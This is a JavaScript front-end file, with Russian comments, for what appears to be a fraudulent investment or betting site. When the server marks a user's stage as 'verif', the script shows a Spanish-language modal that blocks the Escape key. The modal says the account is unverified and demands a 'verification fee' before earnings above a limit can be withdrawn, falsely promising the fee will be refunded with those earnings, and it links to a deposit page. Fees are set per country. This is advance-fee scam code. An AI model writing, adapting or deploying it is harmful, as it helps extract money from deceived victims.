document.addEventListener("DOMContentLoaded", function () {
  // Проверяем, определен ли USER_ID
  const userId = typeof USER_ID !== "undefined" ? USER_ID : null;
  if (!userId) {
    console.error("User ID is not available");
    return;
  }

  // Проверяем, есть ли данные пользователя в глобальной области
  const userData = window.userData || {};

  // Проверяем статус пользователя
  async function checkUserStage() {
    try {
      const response = await fetch(
        `get_user_status.php?user_id=${encodeURIComponent(userId)}`
      );
      if (!response.ok) throw new Error("Network response was not ok");
      return await response.json();
    } catch (error) {
      console.error("Error checking user status:", error);
      return null;
    }
  }

  // Создаем и показываем модальное окно
  function showVerificationModal(countrySetting) {
    // Удаляем предыдущее модальное окно, если оно есть
    const existingModal = document.getElementById("transactionModal");
    if (existingModal) {
      existingModal.remove();
    }

    const modalHTML = `
      <div class="modal fade show" id="transactionModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-modal="true" role="dialog" style="display: block; background-color: rgba(0,0,0,0.5); position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1050;">
        <div class="modal-dialog" style="margin: auto; max-width: 600px; height: 100%; display: flex; align-items: center; pointer-events: none;">
          <div class="modal-content" style="border-radius: 15px; pointer-events: auto;">
            <div class="_container_15zx8_19 _container_heightAuto_15zx8_27">
              <div>
                <div class="_head_10y1t_76 _head_color_green_10y1t_104 _head_desktop_10y1t_88" style="border-radius: 15px; position: relative;">
                  <svg width="144" height="130" viewBox="0 0 144 130" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <g opacity="0.1">
                      <path d="M111.628 17.8389L120.77 21.4838L106.194 37.3233L113.865 43.0161L95.2512 56.8294L98.4242 62.4229L72.1608 108.726L45.8971 62.4229L49.0701 56.8291L30.4563 43.0161L38.1275 37.3236L23.5508 21.4841L32.4245 17.946C29.8231 12.9085 27.6154 7.18264 25.5029 1.15791H0L58.4064 130H85.6008L144 1.15791H118.495C116.398 7.14004 114.206 12.8279 111.628 17.8389Z" fill="black"></path>
                      <path d="M136.333 -56.0461C109.792 -38.5286 104.918 -10.498 95.5236 0.129364C99.1967 -17.5356 92.559 -26.9903 106.935 -42.5995C89.9579 -31.28 96.0359 -15.9238 89.303 -0.683891L87.7949 -1.56792C96.2198 -25.3343 73.3298 -55.7099 108.436 -74C67.5759 -61.4941 79.3861 -34.0497 75.04 -9.04321L72.1606 -10.7307L69.281 -9.04321C64.9349 -34.0497 76.7453 -61.4941 35.8844 -74C70.9911 -55.7099 48.1017 -25.3342 56.5263 -1.5679L54.7567 -0.530853C47.9148 -15.8212 54.0985 -31.242 37.0648 -42.5994C51.4402 -26.9902 44.8028 -17.5355 48.476 0.129387C39.0813 -10.4983 34.2072 -38.5285 7.66733 -56.046C26.5193 -38.8968 30.1245 3.84444 44.3543 21.857L37.3862 24.6353L50.1061 38.457L43.9626 43.0161L59.5797 54.6052L55.1454 62.4229L72.1607 92.4211L89.1759 62.4229L84.7419 54.6055L100.359 43.0161L94.2152 38.457L106.935 24.6352L99.7196 21.7587C113.887 3.69006 117.514 -38.9273 136.333 -56.0461ZM59.0439 40.5436L48.3543 20.2334L64.5806 32.0339L59.0439 40.5436ZM85.2772 40.5436L79.7404 32.0339L95.9667 20.2334L85.2772 40.5436Z" fill="black"></path>
                    </g>
                  </svg>
                  <h3 class="_title_10y1t_114 _title_fontSize_medium_10y1t_131">
                    SU CUENTA NO ESTÁ VERIFICADA
                  </h3>
                </div>
              </div>
              <div class="modal-body">
                <div class="row text-center justify-content-center" style="padding: 1rem;">
                  <img style="margin-bottom: 15px; width: 58px;" class="secure-icon" src="./images/secure-new.png" alt="secure-icon">
                  <b id="modalMessage" style="text-align: left;font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;Helvetica Neue&quot;, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;, &quot;Segoe UI Symbol&quot;;">
                    Por razones de seguridad del cliente,
                    para retirar ganancias superiores a 
                    ${countrySetting.limitAmount} ${countrySetting.currencyName}, deberá verificar 
                    su cuenta. <br><br>
                    Para ello, deberá realizar un pago de ${countrySetting.verificationFee} ${countrySetting.currencyName}. <br><br>
                    El importe del pago se sumará a sus ganancias y se abonará en su cuenta junto con sus ganancias.
                  </b>
                  <a style="margin-top: 20px; font-size: 20px;" href="/deposit.php" class="_button_1r6hv_1 _button_color_blue_1r6hv_36 _button_border-radius_medium_1r6hv_23 _button_color_green_1r6hv_39 _button_border_1r6hv_20 _button_flex_1r6hv_14 _button_fixHeight_1r6hv_76 _button_55s1z_14">
                    VERIFICAR CUENTA
                  </a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    `;

    document.body.insertAdjacentHTML("beforeend", modalHTML);

    // Блокируем клавишу ESC
    document.addEventListener(
      "keydown",
      function (e) {
        if (e.key === "Escape") {
          e.preventDefault();
          e.stopPropagation();
        }
      },
      true
    );

    // Убираем обработчик клика вне модального окна
  }

  // Основная функция
  async function init() {
    try {
      const statusData = await checkUserStage();
      if (!statusData || statusData.error) {
        console.error("Error or no data received:", statusData?.error);
        return;
      }

      if (statusData.stage === "verif") {
        const response = await fetch("../country_settings.json");
        if (!response.ok) throw new Error("Failed to load country settings");

        const data = await response.json();
        const countrySettings = data.countrySettings;
        const country = userData.country || "Ecuador"; // Значение по умолчанию

        if (countrySettings[country]) {
          showVerificationModal(countrySettings[country]);
        } else {
          showVerificationModal({
            limitAmount: "X",
            verificationFee: "X",
            currencyName: "USD",
            minAmount: 0,
          });
        }
      }
    } catch (error) {
      console.error("Initialization error:", error);
      showVerificationModal({
        limitAmount: "X",
        verificationFee: "X",
        currencyName: "USD",
        minAmount: 0,
      });
    }
  }

  // Запускаем проверку
  init();
});
